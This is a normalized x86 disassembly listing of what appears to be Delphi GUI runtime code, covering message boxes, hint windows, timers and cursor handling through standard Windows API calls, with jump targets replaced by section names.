mov edx 0x8
call sub_4026fc
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_417d84
jmp r-xdata
sub_46028c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push sub_4602ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_44642c
mov [ esi + 0x44 ] edi
sub_46030c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_4603ea
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_457124
call sub_407e98
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4603f1
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_45aa00
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push j_sub_40360c#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_460178
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_459908
mov eax [ ebp - 0x4 ]
call sub_45fcdc
jmp r-xdata
sub_46040c
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_40276c
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_40278c
push eax
call sub_40276c
pop edx
call sub_40b904
call sub_40276c
mov edx [ rw-data ]
call sub_4032f8
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_40276c
mov edx eax
mov eax ebx
call sub_460604
pop esi
pop ebx
retn
call sub_40276c
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_46049c
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_4571ac
mov [ ebp - 0x10 ] eax
call sub_4570c8
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_45f440
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_4605f1
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4605f8
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_457260
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_4570d0
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_460604
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4606bf
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_403fd8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_45fec8
mov eax [ ebp - 0x108 ]
call sub_404400
push eax
mov eax [ ebp - 0x4 ]
call sub_404400
mov edx eax
mov eax ebx
pop ecx
call sub_46049c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4606c6
lea eax [ ebp - 0x108 ]
call sub_403f40
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
mov eax [ ebp - 0x4 ]
call sub_4088a0
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402c74
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402a8c
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404208
sub_4606dc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_4465ec
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_446754
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_460d80
test al al
je r-xdata
call sub_446450
mov ebp eax
mov eax edi
call sub_446450
mov ebp eax
mov eax esi
call sub_460d80
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_460844
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_46089c
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_460d80
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4615cc
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4608a3
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_4608ac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_460904
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_460d80
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4615cc
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46090b
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_46091c
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_40316c
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_43fd50
jmp r-xdata
sub_46096c
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_45df18
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_446450
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45df04
mov ebx eax
mov eax ebx
call sub_446754
test al al
je r-xdata
mov eax ebx
call sub_446450
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_4609d0
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_43e45c
mov edi eax
call sub_43cd58
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_440d98
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_440d98
sub_460a48
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_460b58
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4609d0
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_45ea80
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_43ccc0
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_460c08
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push j_sub_40360c#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_460fa0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46096c
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_41dfa4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_460b5f
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f64
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_460b68
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_45defc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_45dee8
movzx edx di
xor ecx ecx
call sub_440d98
inc esi
dec ebx
jne r-xdata
sub_460ba4
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_45fcc0
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_45fcc0
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_460b68
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_460c08
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_40434c
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_403f94
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_439480
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44c4a4
xor eax eax
push ebp
push sub_460c8d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_40316c
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_460c9c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_460cf8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_45defc
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_460c9c
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_45dee8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_460c9c
pop ecx
jmp r-xdata
mov eax ebx
call sub_446754
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_446450
push eax
call IsChild
test eax eax
jne r-xdata
sub_460d80
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_4058d0
call sub_429c44
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_460da8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_460dec
push sub_45ead8
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_460fa0
sub_460e14
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406cd8
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_43f6c8
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_43e45c
call sub_45eab8
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_460fa0
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406cd8
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_43f6c8
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_460fa0
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_460da8
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_440d98
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_461238
jmp r-xdata
sub_460f24
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_460dec
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_461238
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_460f5c
jmp r-xdata
sub_460f5c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_446754
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_446450
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_446450
push eax
call ShowWindow
sub_460fa0
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_460f5c
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_45ec40
mov eax ebx
call sub_460dec
sub_460fd8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_46111a
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_423c90
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_407e4c
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_4610eb
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_423d48
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4610f2
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4026fc
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_460fc8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_460fc8
mov [ ebp - 0x4 ] eax
sub_4610f2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_46112c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_40316c
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_4030b4
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_46118c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_461226
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46122d
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_404030
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_42282c
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40c5b0
mov ebx eax
inc ebx
sub_461238
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_4048ac
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_4615be
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_460fa0
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_460da8
jmp r-xdata
call sub_457378
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4615c5
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_403f64
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_40497c
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_43e45c
call sub_45eab8
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_460fd8
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_45de7c
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43f550
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_43f6f4
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_45ea80
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_43cc7c
mov edx [ ebp - 0x8c ]
